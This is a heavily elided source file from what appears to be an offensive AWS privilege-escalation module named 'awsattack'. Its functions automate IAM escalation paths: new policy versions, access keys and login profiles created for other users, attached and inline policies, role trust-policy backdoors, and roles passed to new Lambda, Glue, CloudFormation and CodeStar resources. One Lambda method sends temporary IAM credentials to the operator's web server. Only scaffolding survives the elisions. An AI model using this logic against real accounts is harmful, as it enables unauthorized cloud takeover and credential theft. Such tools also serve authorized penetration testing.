...
def main(args, awsattack_main):
    ...
    if args.offline is True:
        ...
        if args.folder is None:
            ...
            if os.path.isdir(folder) is False:
                print('⣿ awsattack :≫ OPERATOR ERROR: {} not found! Preerq TTPs Required   {} yet...\n'.format(folder, technique_info['prerequisite_modules'][0]))
                if fetch_data(['All users/roles permissions'], technique_info['prerequisite_modules'][0], '--all-users --all-roles') is False:
    ...
    if 'Permissions' in target and 'Allow' in target['Permissions']:
        ...
        if target['Permissions']['Allow'] == {} and target['Permissions']['Deny'] == {}:
            ...
            if fetch_data(['Current User/Role', 'Permissions'], technique_info['prerequisite_modules'][0], '') is False:
    ...
    if args.scan_only is False and (len(checked_methods['Confirmed']) > 0 or len(checked_methods['Potential']) > 0):
        ...
        if len(checked_methods['Confirmed']) > 0:
            ...
            for confirmed_method in checked_methods['Confirmed']:
                try:
                    response = methods[confirmed_method](awsattack_main, print, input, fetch_data)
        ...
        if escalated is False and len(checked_methods['Potential']) > 0:  # If confirmed methods did not work out
            ...
            for potential_method in checked_methods['Potential']:
                try:
                    response = methods[potential_method](awsattack_main, print, input, fetch_data)
                except Exception as error:
                    print('Uncaught error, counting this method as a fail: {}'.format(error))
                    response = False
...
def CreateNewPolicyVersion(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
    ...
    if not policy_arn:
        ...
        if not policy_arn:
            ...
            if fetch.strip().lower() == 'n':
                ...
                if fetch_data(None, technique_info['prerequisite_modules'][0], '', force=True) is False:
                    print('Pre-req module not run successfully. Skipping method...')
                    return False
                return CreateNewPolicyVersion(awsattack_main, print, input, fetch_data)
...
def SetExistingDefaultPolicyVersion(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
        ...
        if not policy_arn and active_aws_key.allow_permissions == {}:
            ...
            if fetch.strip().lower() == 'n':
                ...
                if fetch_data(None, technique_info['prerequisite_modules'][0], '', force=True) is False:
                    print('Pre-req module not run successfully. Skipping method...\n')
                    return False
                return SetExistingDefaultPolicyVersion(awsattack_main, print, input, fetch_data)
...
def CreateEC2WithExistingIP(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()

    print('  Starting method CreateEC2WithExistingIP...\n')

    regions = awsattack_main.get_regions('ec2')
    region = None
    ...
    if len(regions) > 1:
        ...
        while not region:
            all_ec2_regions = awsattack_main.get_regions('ec2', check_session=False)
...
def CreateAccessKey(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
    ...
    if fetch_data(['IAM', 'Users'], technique_info['prerequisite_modules'][1], '--users') is False:
        print('Pre-req module not run successfully. Exiting...')
        return False
    ...
    try:
        fetch_data(None, technique_info['prerequisite_modules'][2], '--usernames {}'.format(username), force=True)
    except Exception as e:
        ...
        if again.strip().lower() == 'y':
            ...
            return CreateAccessKey(awsattack_main, print, input, fetch_data)
        else:
            return False
    return True


def CreateLoginProfile(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
    ...
    try:
        if int(choice) == 1:
            ...
            fetch_data(None, technique_info['prerequisite_modules'][3], '--usernames {}'.format(user_string), force=True)
        else:
            fetch_data(None, technique_info['prerequisite_modules'][3], '--usernames {}'.format(username), force=True)
    except Exception as e:
        ...
        if again == 'y':
            ...
            return CreateLoginProfile(awsattack_main, print, input, fetch_data)
        else:
            return False
    return True


def UpdateLoginProfile(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
    ...
    try:
        if int(choice) == 1:
            ...
            for user in users:
                user_string = '{},{}'.format(user_string, user['UserName'])  # Prepare username list for backdoor_users_password
            user_string = user_string[1:]  # Remove first comma
            fetch_data(None, technique_info['prerequisite_modules'][3], '--update --usernames {}'.format(user_string), force=True)
        else:
            fetch_data(None, technique_info['prerequisite_modules'][3], '--update --usernames {}'.format(username), force=True)
        return True
    except Exception as e:
        ...
        if again == 'y':
            ...
            return UpdateLoginProfile(awsattack_main, print, input, fetch_data)
        else:
            return False


def AttachUserPolicy(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
...
def AttachGroupPolicy(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
...
def AttachRolePolicy(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
    ...
    if not target_role:
        if fetch_data(['IAM', 'Roles'], technique_info['prerequisite_modules'][1], '--roles', force=True) is False:
            print('Pre-req module not run successfully. Exiting...')
            return False
...
def PutUserPolicy(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
    active_aws_key = session.get_active_aws_key(awsattack_main.database)
...
def PutGroupPolicy(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
    active_aws_key = session.get_active_aws_key(awsattack_main.database)
...
def PutRolePolicy(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
...
def AddUserToGroup(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
    ...
    if group_name == '':
        if fetch_data(['IAM', 'Groups'], technique_info['prerequisite_modules'][1], '--groups') is False:
            print('Pre-req module not run successfully. Exiting...')
            return False
    ...
    try:
        ...
        if again == 'y':
            ...
            return AddUserToGroup(awsattack_main, print, input, fetch_data)
        else:
            return False


def UpdateRolePolicyToAssumeIt(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
    ...
    try:
        if fetch_data(['Backdooring Roles'], technique_info['prerequisite_modules'][4], '--role-names {}'.format(target_role), force=True) is False:
            print('Pre-req module not run successfully. Exiting...')
            return False
        ...
        if again == 'y':
            ...
            return UpdateRolePolicyToAssumeIt(awsattack_main, print, input, fetch_data)
        else:
            return False


def PassExistingRoleToNewLambdaThenInvoke(awsattack_main, print, input, fetch_data):
    print('  Starting method PassExistingRoleToNewLambdaThenInvoke...\n')

    try:
        function_name, region = pass_existing_role_to_lambda(awsattack_main, print, input, fetch_data)
...
def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(awsattack_main, print, input, fetch_data):
    ...
    client = awsattack_main.get_boto3_client('dynamodb', region)
...
def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(awsattack_main, print, input, fetch_data):
    print('  Starting method PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo...\n')

    # Enumerate DynamoDB Streams
    regions = awsattack_main.get_regions('streams.dynamodb')
    target_region = None
    if len(regions) == 0:
        all_dynamodbstreams_regions = awsattack_main.get_regions('streams.dynamodb', check_session=False)
    ...
    for region in regions:
        client = awsattack_main.get_boto3_client('dynamodbstreams', region)
    ...
    try:
        subprocess.run(['zip', './modules/{}/lambda_function.zip'.format(technique_info['name']), './modules/{}/lambda_function.py'.format(technique_info['name'])], shell=True)
    except Exception as error:
    ...
    # Create Lambda function
    try:
        function_name, region = pass_existing_role_to_lambda(awsattack_main, print, input, fetch_data, zip_file='./modules/{}/lambda_function.zip'.format(technique_info['name']), region=target_region)
    except Exception as error:
        print('Failed to create a new Lambda function: {}\n'.format(error))
        return False
    ...
    print('You should now start receiving HTTP requests to your web server that include a set of temporary IAM credentials. Depending on the conditions associated with the DynamoDB Streams, it might take longer than expected. These requests will continue coming until the Lambda function or DynamoDB Streams are deleted or the Lambda event source mapping is deleted from the function. You can enter the exfiltrated credentials into AWSc2 with the "set_keys" command to try and expand access.\n')
    return True


def pass_existing_role_to_lambda(awsattack_main, print, input, fetch_data, zip_file='', region=None):
    session = awsattack_main.get_active_session()

    if zip_file == '':
        zip_file = './modules/{}/lambda.zip'.format(technique_info['name'])

    if region is None:
        regions = awsattack_main.get_regions('lambda')
        ...
        if len(regions) > 1:
            ...
            while not region:
                all_lambda_regions = awsattack_main.get_regions('lambda', check_session=False)
                region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
                if not region:
                    return False
...
def PassExistingRoleToNewGlueDevEndpoint(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
    ...
    regions = awsattack_main.get_regions('glue')
    region = None
    ...
    if len(regions) > 1:
        ...
        while not region:
            all_glue_regions = awsattack_main.get_regions('glue', check_session=False)
            region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
            if not region:
                return False
...
def UpdateExistingGlueDevEndpoint(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
    ...
    choice = 0
    if endpoint_name == '':
        if fetch_data(['Glue', 'DevEndpoints'], technique_info['prerequisite_modules'][5], '--dev-endpoints', force=True) is False:
            print('Pre-req module not run successfully. Exiting...')
            return False
        ...
        client = awsattack_main.get_boto3_client('glue', dev_endpoints[int(choice) - 1]['Region'])
    ...
    try:
        ...
        if again == 'y':
            ...
            return UpdateExistingGlueDevEndpoint(awsattack_main, print, input, fetch_data)
        else:
            return False
    return True


def PassExistingRoleToNewCloudFormation(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
    ...
    regions = awsattack_main.get_regions('cloudformation')
    if len(regions) > 1:
        print('  Found multiple valid regions to use. Choose one below.\n')
        for i in range(0, len(regions)):
            print('  [{}] {}'.format(i, regions[i]))
        ...
        while not region:
            all_cloudformation_regions = awsattack_main.get_regions('cloudformation', check_session=False)
            region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
            if not region:
                return False
    ...
    client = awsattack_main.get_boto3_client('cloudformation', region)
...
def PassExistingRoleToNewDataPipeline(awsattack_main, print, input, fetch_data):
...
def CodeStarCreateProjectFromTemplate(awsattack_main, print, input, fetch_data):
...
def PassExistingRoleToNewCodeStarProject(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()

    print('  Starting method PassExistingRoleToNewCodeStarProject...\n')

    regions = awsattack_main.get_regions('codestar')
    region = None
    ...
    if len(regions) > 1:
        ...
        while not region:
            all_codestar_regions = awsattack_main.get_regions('codestar', check_session=False)
            region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
            if not region:
                return False
    ...
    client = awsattack_main.get_boto3_client('codestar', region)
    active_aws_key = session.get_active_aws_key(awsattack_main.database)
...
def CodeStarCreateProjectThenAssociateTeamMember(awsattack_main, print, input, fetch_data):
    session = awsattack_main.get_active_session()
...
def EditExistingLambdaFunctionWithRole(awsattack_main, print, input, fetch_data):
    print('  Starting method EditExistingLambdaFunctionWithRole...\n')

    if fetch_data(['Lambda', 'Functions'], technique_info['prerequisite_modules'][6], '', force=True) is False:
        print('Pre-req module not run successfully. Exiting...')
        return False
    ...
    print('You can now view the enumerated Lambda data by running the "data Lambda" command in AWSc2.\n')
    return True
